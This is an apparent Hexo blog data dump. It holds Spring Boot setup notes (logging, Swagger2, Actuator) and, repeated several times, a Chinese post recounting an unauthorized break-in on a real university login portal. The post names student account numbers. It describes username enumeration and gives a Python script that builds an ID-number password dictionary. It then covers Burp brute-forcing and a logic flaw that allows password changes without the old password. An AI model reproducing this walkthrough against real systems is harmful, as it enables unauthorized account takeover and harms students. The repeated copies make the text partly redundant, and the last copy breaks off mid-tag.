class=\"line\">&lt;/Configuration&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Controller</span><br><span class=\"line\">public class TestController &#123;</span><br><span class=\"line\">    Logger logger = LogManager.getLogger(TestController.class);</span><br><span class=\"line\"></span><br><span class=\"line\">    @RequestMapping(value = &quot;test&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">    @ResponseBody</span><br><span class=\"line\">    public String test()&#123;</span><br><span class=\"line\">        logger.debug(&quot;test debug&quot;);</span><br><span class=\"line\">        logger.info(&quot;test info&quot;);</span><br><span class=\"line\">        logger.warn(&quot;test warn&quot;);</span><br><span class=\"line\">        logger.error(&quot;test error&quot;);</span><br><span class=\"line\">        logger.fatal(&quot;test fatal&quot;);</span><br><span class=\"line\">        return &quot;ok&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"2-Restful-API\"><a href=\"#2-Restful-API\" class=\"headerlink\" title=\"2.Restful API\"></a>2.Restful API</h4><p>使用swagger2</p>\n<ul>\n<li><p>依赖</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  &lt;!-- Swagger依赖 注意版本一致--&gt;</span><br><span class=\"line\">  &lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;2.2.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;2.2.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>配置类</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Configuration</span><br><span class=\"line\">@EnableSwagger2</span><br><span class=\"line\">public class Swagger2 &#123;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * apis()设置监控路径</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @Bean</span><br><span class=\"line\">    public Docket createRestApi() &#123;</span><br><span class=\"line\">        return new Docket(DocumentationType.SWAGGER_2)</span><br><span class=\"line\">                .apiInfo(apiInfo())</span><br><span class=\"line\">                .select()</span><br><span class=\"line\">                .apis(RequestHandlerSelectors.basePackage(&quot;com.example.springboottemplate.controllers&quot;))</span><br><span class=\"line\">                .paths(PathSelectors.any())</span><br><span class=\"line\">                .build();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 创建api基本信息，会展示在文档页面</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    private ApiInfo apiInfo() &#123;</span><br><span class=\"line\">        return new ApiInfoBuilder()</span><br><span class=\"line\">                .title(&quot;Swagger2 demo&quot;)</span><br><span class=\"line\">                .description(&quot;Spring Boot中使用Swagger2构建RESTful APIs&quot;)</span><br><span class=\"line\">                .version(&quot;1.0&quot;)</span><br><span class=\"line\">                .build();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用<br><br><strong>注意：要使用@RequestParam()接收参数，需要paramType=”query”</strong><br><br>具体参数信息:<a href=\"https://amphilicitezh.github.io/2017/12/04/swaggerui-introduce/\" target=\"_blank\" rel=\"noopener\">https://amphilicitezh.github.io/2017/12/04/swaggerui-introduce/</a></p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Api(value = &quot;测试接口类TestController&quot;)</span><br><span class=\"line\">@Controller</span><br><span class=\"line\">@ResponseBody</span><br><span class=\"line\">public class TestController &#123;</span><br><span class=\"line\">    Logger logger = LogManager.getLogger(TestController.class);</span><br><span class=\"line\"></span><br><span class=\"line\">    @ApiOperation(value = &quot;测试get不带参数&quot;,notes = &quot;测试get不带参数&quot;)</span><br><span class=\"line\">    @RequestMapping(value = &quot;test1&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">    public String test()&#123;</span><br><span class=\"line\">        logger.debug(&quot;test debug&quot;);</span><br><span class=\"line\">        logger.info(&quot;test info&quot;);</span><br><span class=\"line\">        logger.warn(&quot;test warn&quot;);</span><br><span class=\"line\">        logger.error(&quot;test error&quot;);</span><br><span class=\"line\">        logger.fatal(&quot;test fatal&quot;);</span><br><span class=\"line\">        return &quot;ok&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ApiOperation(value = &quot;测试get带参数&quot;,notes = &quot;测试get带参数&quot;)</span><br><span class=\"line\">    @ApiImplicitParam(name = &quot;username&quot;, value = &quot;用户名&quot;, required = true, dataType = &quot;String&quot;,paramType = &quot;query&quot;)</span><br><span class=\"line\">    @RequestMapping(value = &quot;test2&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">    public String test2(@RequestParam(&quot;username&quot;) String username)&#123;</span><br><span class=\"line\">        if(!username.equals(&quot;&quot;) &amp;&amp; username != null)&#123;</span><br><span class=\"line\">            System.out.println(username);</span><br><span class=\"line\">            return username;</span><br><span class=\"line\">        &#125;else &#123;</span><br><span class=\"line\">            return &quot;null&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ApiOperation(value = &quot;测试post带实体参数&quot;, notes = &quot;测试post带实体参数&quot;)</span><br><span class=\"line\">    @ApiImplicitParam(name = &quot;user&quot;,value = &quot;用户名&quot;,required = true, dataType = &quot;Map&lt;String,Object&gt;&quot;)</span><br><span class=\"line\">    @ApiResponses(&#123;</span><br><span class=\"line\">           @ApiResponse(code = 400, message = &quot;请求参数没填好,注意为json&quot;),</span><br><span class=\"line\">           @ApiResponse(code = 404, message = &quot;请求路径没有或页面跳转路径不对&quot;),</span><br><span class=\"line\">           @ApiResponse(code = 500, message = &quot;服务器端发生错误&quot;)</span><br><span class=\"line\">   &#125;)</span><br><span class=\"line\">    @RequestMapping(value = &quot;/test3&quot;, method = RequestMethod.POST)</span><br><span class=\"line\">    public String test3(@RequestBody Map&lt;String,Object&gt; user)&#123;</span><br><span class=\"line\">        System.out.println(user.get(&quot;username&quot;).toString());</span><br><span class=\"line\">        System.out.println(user.get(&quot;password&quot;).toString());</span><br><span class=\"line\">        return &quot;ok&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ApiOperation(value = &quot;测试post参数为String&quot;, notes = &quot;测试post参数为String&quot;)</span><br><span class=\"line\">    @ApiImplicitParams(&#123;</span><br><span class=\"line\">            @ApiImplicitParam(name = &quot;username&quot;, value = &quot;用户名&quot;, required = true, paramType = &quot;query&quot;, dataType = &quot;String&quot;),</span><br><span class=\"line\">            @ApiImplicitParam(name = &quot;password&quot;, value = &quot;密码&quot;, required = true, paramType = &quot;query&quot;, dataType = &quot;String&quot;)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    @RequestMapping(value = &quot;/test4&quot;, method = RequestMethod.POST)</span><br><span class=\"line\">    public String test4(@RequestParam(&quot;username&quot;) String username,</span><br><span class=\"line\">                        @RequestParam(&quot;password&quot;) String passwprd)&#123;</span><br><span class=\"line\">       return username + &quot;:&quot; + passwprd;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ApiOperation(value = &quot;测试restful类型接口&quot;, notes = &quot;测试restful类型接口&quot;)</span><br><span class=\"line\">    @RequestMapping(value = &quot;/test5/&#123;name&#125;&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">    @ApiImplicitParam(name = &quot;username&quot;, value = &quot;用户名&quot;, required = true, paramType = &quot;query&quot;, dataType = &quot;String&quot;)</span><br><span class=\"line\">    public String test5(@PathVariable(&quot;name&quot;) String name,</span><br><span class=\"line\">                        @RequestParam(&quot;username&quot;) String username)&#123;</span><br><span class=\"line\">        return name + &quot; : &quot; + username;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>访问:<a href=\"http://127.0.0.1:8080/swagger-ui.html\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/swagger-ui.html</a></p>\n<h4 id=\"3-Health\"><a href=\"#3-Health\" class=\"headerlink\" title=\"3.Health\"></a>3.Health</h4><p>这是2.0版本：<a href=\"https://blog.csdn.net/alinyua/article/details/80009435\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/alinyua/article/details/80009435</a><br><br>可以直观的看到自己CPU的利用率、内存的利用率、数据库连接是否正常等信息</p>\n<ul>\n<li><p>依赖</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;!--&lt;version&gt;2.1.0.RELEASE&lt;/version&gt;--&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Springboot2版本需要在application.properties加入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">management.endpoints.web.exposure.include=*</span><br><span class=\"line\">#显示所有健康状态，需要加配置</span><br><span class=\"line\">management.endpoint.health.show-details=always</span><br></pre></td></tr></table></figure>\n<p>内置EndPoints：</p>\n<blockquote>\n<p><a href=\"http://127.0.0.1:8080/actuator\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/actuator</a><br><br><a href=\"http://127.0.0.1:8080/actuator/health\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/actuator/health</a><br><br><a href=\"http://127.0.0.1:8080/actuator/info\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/actuator/info</a><br><br><a href=\"http://127.0.0.1:8080/actuator/beans\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/actuator/beans</a><br><br><a href=\"http://127.0.0.1:8080/actuator/httptrace\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/actuator/httptrace</a></p>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"4-Eureka\"><a href=\"#4-Eureka\" class=\"headerlink\" title=\"4.Eureka\"></a>4.Eureka</h4>"},{"title":"一个渗透小例子","date":"2018-12-18T07:54:01.000Z","_content":"\n看了好久的渗透概念性东西，都没有实践过，今天想试一下，随意找了一个学校官网(自知菜鸟水平，还没入门，不敢找太好的学校)。\n![indexPage](../../../images/security/example/index_page.png)\n\n#### 1.找到薄弱点\n官网一般相对安全一点，所以通常从子域名下手。<br>\nchrome搜索，输入: inurl:cdnu.edu.cn\n\n![searchPage](../../../images/security/example/search_page.png)\n\n看到一个身份认证平台<br>\n一般这些都是后台登录界面<br>\n点进去\n![searchPage](../../../images/security/example/login_page.png)\n\n可以看到，不仅没有验证码，还清楚的告诉你了账号为学号，默认密码为身份证后六位。典型的用于给我们进行爆破。\n\n#### 2.信息收集\n为了能进行爆破，先要得到学号。<br>\n直接google和百度.\n![searchPage](../../../images/security/example/studentid_search_01.png)\n\n![searchPage](../../../images/security/example/studentid_search_02.png)\n\n![searchPage](../../../images/security/example/studentid_search_03.png)\n\n可以看到，在搜索一些国内的网站信息时，百度还是要好用一点。<br>\n\n尝试登录：160003021029/123456<br>\n返回:用户名或密码错误。到这还看不出什么<br>\n再尝试输入: 160000000000/123456<br>\n返回：用户名不存在。(由此可知160003021029用户是存在的，同理，可以知道160003021030等等)<br>\n\n在这一步，由于网站的 <strong>不恰当返回信息处理</strong> (用户名枚举)，我们得到了可用用户名.<br>\n\n接下来该进行爆破了，先生成身份证后六位的密码字典.<br>\n因为从学号可看出是2016届的，所以推测生日应该在1997-1999年，这样字典就只有三万条.\n```\nimport os\n\n# ##########################\n# 生成身份证后六位的密码字典\n# ##########################\nyear_start = input(\"请输入开始年份(四位): \")\nyear_end = input(\"请输入结束年份(四位):\")\n\nif len(year_start) != 4 or len(year_end) != 4:\n    print(\"输入格式有误\")\n    exit(-1)\nelse:\n    year_count = abs(int(year_end) - int(year_start)) + 1\n    file_path = os.getcwd() + \"/\" + year_start + \"-\" + year_end + \"dict.txt\"\n    f = open(file_path, \"a+\")\n    for index in range(0, year_count):\n        res = []\n        if year_start < year_end:\n            list_temp = []\n            for i in range(0, 10000):\n                list_temp.append(str((int(year_start) + index))[-2:] + str(i).zfill(4))\n                f.write(str((int(year_start) + index))[-2:] + str(i).zfill(4))\n                f.write(\"\\n\")\n            res.append(list_temp)\n        else:\n            for i in range(0, 9999):\n                list_temp.append(str((int(year_end) + index))[-2:] + str(i).zfill(4))\n                f.write(str((int(year_end) + index))[-2:] + str(i).zfill(4))\n                f.write(\"\\n\")\n            res.append(list_temp)\n    f.close()\n```\n#### 3.进行尝试\n使用burpsuite抓包，然后进行爆破<br>\n没有成功<br>\n换弱密码top100,再次尝试。<br>\n\n![searchPage](../../../images/security/example/password_success.png)\n\n这次可以看到密码：12345不一样，进行手动登录尝试(160003021029/12345).\n\n![searchPage](../../../images/security/example/password_modify.png)\n\n出现此界面，修改密码。\n\n![searchPage](../../../images/security/example/login_success.png)\n\nnice,登录成功。<br>\n\n注销登录，换(160003021030/12345)再次尝试<br>\n发现再次出现修改密码界面。<br>\n160003021030/123 再次尝试，并没此问题.<br>\n\n\n由此惊讶的猜测测，12345并不是真是密码，而是由于逻辑错误造成的漏洞利用<br>\n\n\n右击登录按钮，检查元素，查看源代码.<br>\n![searchPage](../../../images/security/example/code_logic.png)\n\n![searchPage](../../../images/security/example/code_logic_02.png)\n\n可以看到，因为触发了该界面，可以直接更改密码，且不需要输入密码<br>\n到此，因为没有挂代理，不敢进行下一步操作。\n\n#### 4.事后分析\n- 网站登录没有验证码，给了爆破利用空间。<br>\n- 网站登录返回信息处理失误，应统一返回用户或密码出错。<br>\n- 网站逻辑处理有漏洞，如更改密码不需要旧密码。<br>\n- 网站敏感信息能被看到<br>\n","source":"_posts/security/example/cdnu-example-login.md","raw":"---\ntitle: \"一个渗透小例子\"\ndate: 2018-12-18 15:54:01\ntags: [渗透]\n---\n\n看了好久的渗透概念性东西，都没有实践过，今天想试一下，随意找了一个学校官网(自知菜鸟水平，还没入门，不敢找太好的学校)。\n![indexPage](../../../images/security/example/index_page.png)\n\n#### 1.找到薄弱点\n官网一般相对安全一点，所以通常从子域名下手。<br>\nchrome搜索，输入: inurl:cdnu.edu.cn\n\n![searchPage](../../../images/security/example/search_page.png)\n\n看到一个身份认证平台<br>\n一般这些都是后台登录界面<br>\n点进去\n![searchPage](../../../images/security/example/login_page.png)\n\n可以看到，不仅没有验证码，还清楚的告诉你了账号为学号，默认密码为身份证后六位。典型的用于给我们进行爆破。\n\n#### 2.信息收集\n为了能进行爆破，先要得到学号。<br>\n直接google和百度.\n![searchPage](../../../images/security/example/studentid_search_01.png)\n\n![searchPage](../../../images/security/example/studentid_search_02.png)\n\n![searchPage](../../../images/security/example/studentid_search_03.png)\n\n可以看到，在搜索一些国内的网站信息时，百度还是要好用一点。<br>\n\n尝试登录：160003021029/123456<br>\n返回:用户名或密码错误。到这还看不出什么<br>\n再尝试输入: 160000000000/123456<br>\n返回：用户名不存在。(由此可知160003021029用户是存在的，同理，可以知道160003021030等等)<br>\n\n在这一步，由于网站的 <strong>不恰当返回信息处理</strong> (用户名枚举)，我们得到了可用用户名.<br>\n\n接下来该进行爆破了，先生成身份证后六位的密码字典.<br>\n因为从学号可看出是2016届的，所以推测生日应该在1997-1999年，这样字典就只有三万条.\n```\nimport os\n\n# ##########################\n# 生成身份证后六位的密码字典\n# ##########################\nyear_start = input(\"请输入开始年份(四位): \")\nyear_end = input(\"请输入结束年份(四位):\")\n\nif len(year_start) != 4 or len(year_end) != 4:\n    print(\"输入格式有误\")\n    exit(-1)\nelse:\n    year_count = abs(int(year_end) - int(year_start)) + 1\n    file_path = os.getcwd() + \"/\" + year_start + \"-\" + year_end + \"dict.txt\"\n    f = open(file_path, \"a+\")\n    for index in range(0, year_count):\n        res = []\n        if year_start < year_end:\n            list_temp = []\n            for i in range(0, 10000):\n                list_temp.append(str((int(year_start) + index))[-2:] + str(i).zfill(4))\n                f.write(str((int(year_start) + index))[-2:] + str(i).zfill(4))\n                f.write(\"\\n\")\n            res.append(list_temp)\n        else:\n            for i in range(0, 9999):\n                list_temp.append(str((int(year_end) + index))[-2:] + str(i).zfill(4))\n                f.write(str((int(year_end) + index))[-2:] + str(i).zfill(4))\n                f.write(\"\\n\")\n            res.append(list_temp)\n    f.close()\n```\n#### 3.进行尝试\n使用burpsuite抓包，然后进行爆破<br>\n没有成功<br>\n换弱密码top100,再次尝试。<br>\n\n![searchPage](../../../images/security/example/password_success.png)\n\n这次可以看到密码：12345不一样，进行手动登录尝试(160003021029/12345).\n\n![searchPage](../../../images/security/example/password_modify.png)\n\n出现此界面，修改密码。\n\n![searchPage](../../../images/security/example/login_success.png)\n\nnice,登录成功。<br>\n\n注销登录，换(160003021030/12345)再次尝试<br>\n发现再次出现修改密码界面。<br>\n160003021030/123 再次尝试，并没此问题.<br>\n\n\n由此惊讶的猜测测，12345并不是真是密码，而是由于逻辑错误造成的漏洞利用<br>\n\n\n右击登录按钮，检查元素，查看源代码.<br>\n![searchPage](../../../images/security/example/code_logic.png)\n\n![searchPage](../../../images/security/example/code_logic_02.png)\n\n可以看到，因为触发了该界面，可以直接更改密码，且不需要输入密码<br>\n到此，因为没有挂代理，不敢进行下一步操作。\n\n#### 4.事后分析\n- 网站登录没有验证码，给了爆破利用空间。<br>\n- 网站登录返回信息处理失误，应统一返回用户或密码出错。<br>\n- 网站逻辑处理有漏洞，如更改密码不需要旧密码。<br>\n- 网站敏感信息能被看到<br>\n","slug":"security/example/cdnu-example-login","published":1,"updated":"2018-12-18T09:00:01.577Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr64053k00266cvpctzc4b5a","content":"<p>看了好久的渗透概念性东西，都没有实践过，今天想试一下，随意找了一个学校官网(自知菜鸟水平，还没入门，不敢找太好的学校)。<br><img src=\"../../../images/security/example/index_page.png\" alt=\"indexPage\"></p>\n<h4 id=\"1-找到薄弱点\"><a href=\"#1-找到薄弱点\" class=\"headerlink\" title=\"1.找到薄弱点\"></a>1.找到薄弱点</h4><p>官网一般相对安全一点，所以通常从子域名下手。<br><br>chrome搜索，输入: inurl:cdnu.edu.cn</p>\n<p><img src=\"../../../images/security/example/search_page.png\" alt=\"searchPage\"></p>\n<p>看到一个身份认证平台<br><br>一般这些都是后台登录界面<br><br>点进去<br><img src=\"../../../images/security/example/login_page.png\" alt=\"searchPage\"></p>\n<p>可以看到，不仅没有验证码，还清楚的告诉你了账号为学号，默认密码为身份证后六位。典型的用于给我们进行爆破。</p>\n<h4 id=\"2-信息收集\"><a href=\"#2-信息收集\" class=\"headerlink\" title=\"2.信息收集\"></a>2.信息收集</h4><p>为了能进行爆破，先要得到学号。<br><br>直接google和百度.<br><img src=\"../../../images/security/example/studentid_search_01.png\" alt=\"searchPage\"></p>\n<p><img src=\"../../../images/security/example/studentid_search_02.png\" alt=\"searchPage\"></p>\n<p><img src=\"../../../images/security/example/studentid_search_03.png\" alt=\"searchPage\"></p>\n<p>可以看到，在搜索一些国内的网站信息时，百度还是要好用一点。<br></p>\n<p>尝试登录：160003021029/123456<br><br>返回:用户名或密码错误。到这还看不出什么<br><br>再尝试输入: 160000000000/123456<br><br>返回：用户名不存在。(由此可知160003021029用户是存在的，同理，可以知道160003021030等等)<br></p>\n<p>在这一步，由于网站的 <strong>不恰当返回信息处理</strong> (用户名枚举)，我们得到了可用用户名.<br></p>\n<p>接下来该进行爆破了，先生成身份证后六位的密码字典.<br><br>因为从学号可看出是2016届的，所以推测生日应该在1997-1999年，这样字典就只有三万条.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\"># ##########################</span><br><span class=\"line\"># 生成身份证后六位的密码字典</span><br><span class=\"line\"># ##########################</span><br><span class=\"line\">year_start = input(&quot;请输入开始年份(四位): &quot;)</span><br><span class=\"line\">year_end = input(&quot;请输入结束年份(四位):&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">if len(year_start) != 4 or len(year_end) != 4:</span><br><span class=\"line\">    print(&quot;输入格式有误&quot;)</span><br><span class=\"line\">    exit(-1)</span><br><span class=\"line\">else:</span><br><span class=\"line\">    year_count = abs(int(year_end) - int(year_start)) + 1</span><br><span class=\"line\">    file_path = os.getcwd() + &quot;/&quot; + year_start + &quot;-&quot; + year_end + &quot;dict.txt&quot;</span><br><span class=\"line\">    f = open(file_path, &quot;a+&quot;)</span><br><span class=\"line\">    for index in range(0, year_count):</span><br><span class=\"line\">        res = []</span><br><span class=\"line\">        if year_start &lt; year_end:</span><br><span class=\"line\">            list_temp = []</span><br><span class=\"line\">            for i in range(0, 10000):</span><br><span class=\"line\">                list_temp.append(str((int(year_start) + index))[-2:] + str(i).zfill(4))</span><br><span class=\"line\">                f.write(str((int(year_start) + index))[-2:] + str(i).zfill(4))</span><br><span class=\"line\">                f.write(&quot;\\n&quot;)</span><br><span class=\"line\">            res.append(list_temp)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            for i in range(0, 9999):</span><br><span class=\"line\">                list_temp.append(str((int(year_end) + index))[-2:] + str(i).zfill(4))</span><br><span class=\"line\">                f.write(str((int(year_end) + index))[-2:] + str(i).zfill(4))</span><br><span class=\"line\">                f.write(&quot;\\n&quot;)</span><br><span class=\"line\">            res.append(list_temp)</span><br><span class=\"line\">    f.close()</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"3-进行尝试\"><a href=\"#3-进行尝试\" class=\"headerlink\" title=\"3.进行尝试\"></a>3.进行尝试</h4><p>使用burpsuite抓包，然后进行爆破<br><br>没有成功<br><br>换弱密码top100,再次尝试。<br></p>\n<p><img src=\"../../../images/security/example/password_success.png\" alt=\"searchPage\"></p>\n<p>这次可以看到密码：12345不一样，进行手动登录尝试(160003021029/12345).</p>\n<p><img src=\"../../../images/security/example/password_modify.png\" alt=\"searchPage\"></p>\n<p>出现此界面，修改密码。</p>\n<p><img src=\"../../../images/security/example/login_success.png\" alt=\"searchPage\"></p>\n<p>nice,登录成功。<br></p>\n<p>注销登录，换(160003021030/12345)再次尝试<br><br>发现再次出现修改密码界面。<br><br>160003021030/123 再次尝试，并没此问题.<br></p>\n<p>由此惊讶的猜测测，12345并不是真是密码，而是由于逻辑错误造成的漏洞利用<br></p>\n<p>右击登录按钮，检查元素，查看源代码.<br><br><img src=\"../../../images/security/example/code_logic.png\" alt=\"searchPage\"></p>\n<p><img src=\"../../../images/security/example/code_logic_02.png\" alt=\"searchPage\"></p>\n<p>可以看到，因为触发了该界面，可以直接更改密码，且不需要输入密码<br><br>到此，因为没有挂代理，不敢进行下一步操作。</p>\n<h4 id=\"4-事后分析\"><a href=\"#4-事后分析\" class=\"headerlink\" title=\"4.事后分析\"></a>4.事后分析</h4><ul>\n<li>网站登录没有验证码，给了爆破利用空间。<br></li>\n<li>网站登录返回信息处理失误，应统一返回用户或密码出错。<br></li>\n<li>网站逻辑处理有漏洞，如更改密码不需要旧密码。<br></li>\n<li>网站敏感信息能被看到<br></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<p>看了好久的渗透概念性东西，都没有实践过，今天想试一下，随意找了一个学校官网(自知菜鸟水平，还没入门，不敢找太好的学校)。<br><img src=\"../../../images/security/example/index_page.png\" alt=\"indexPage\"></p>\n<h4 id=\"1-找到薄弱点\"><a href=\"#1-找到薄弱点\" class=\"headerlink\" title=\"1.找到薄弱点\"></a>1.找到薄弱点</h4><p>官网一般相对安全一点，所以通常从子域名下手。<br><br>chrome搜索，输入: inurl:cdnu.edu.cn</p>\n<p><img src=\"../../../images/security/example/search_page.png\" alt=\"searchPage\"></p>\n<p>看到一个身份认证平台<br><br>一般这些都是后台登录界面<br><br>点进去<br><img src=\"../../../images/security/example/login_page.png\" alt=\"searchPage\"></p>\n<p>可以看到，不仅没有验证码，还清楚的告诉你了账号为学号，默认密码为身份证后六位。典型的用于给我们进行爆破。</p>\n<h4 id=\"2-信息收集\"><a href=\"#2-信息收集\" class=\"headerlink\" title=\"2.信息收集\"></a>2.信息收集</h4><p>为了能进行爆破，先要得到学号。<br><br>直接google和百度.<br><img src=\"../../../images/security/example/studentid_search_01.png\" alt=\"searchPage\"></p>\n<p><img src=\"../../../images/security/example/studentid_search_02.png\" alt=\"searchPage\"></p>\n<p><img src=\"../../../images/security/example/studentid_search_03.png\" 